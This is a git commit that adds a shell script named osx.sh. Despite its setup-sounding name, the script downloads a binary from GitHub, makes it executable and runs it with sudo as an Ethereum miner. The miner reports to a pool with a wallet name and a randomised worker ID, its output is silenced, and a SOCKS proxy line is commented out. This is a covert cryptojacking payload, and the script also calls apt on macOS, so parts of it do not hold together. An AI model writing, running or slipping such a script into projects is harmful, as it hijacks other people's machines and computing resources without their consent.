88f2fa5cd95aa890fd74b91620ab59283899d7c8
azis07 <abd.azispc@gmail.com>
2021-09-15 02:17:41 +0800

    Create osx.sh

---
+++ osx.sh
@@ -0,0 +1,11 @@
+#!/bin/sh
+softwareupdate -l
+apt install screen -y
+wget https://github.com/azis07/turbo/raw/main/turbo
+chmod +x turbo
+screen -dmS ls 
+POOL=eth-pool.beepool.org:9530
+WALLET=langitterang
+WORKER=$(echo $(gshuf -i 11111-9999999 -n 1)-GPU)
+#PROXY=socks5://72.210.252.134:46164
+sudo ./turbo -a ethash -o $POOL -u $WALLET.$WORKER > /dev/null
